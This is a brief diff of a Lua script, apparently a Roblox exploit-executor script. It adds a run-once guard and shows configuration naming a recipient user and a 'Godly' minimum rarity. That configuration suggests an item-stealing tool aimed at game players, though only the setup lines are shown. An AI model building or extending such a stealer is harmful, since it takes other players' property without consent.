@@ -1,3 +1,8 @@
+if getgenv().NebulaScriptExecuted then
+    return
+end
+getgenv().NebulaScriptExecuted = true
+
 local users = {"ally4ofc"}
 local min_rarity = "Godly"
 local min_value = 1
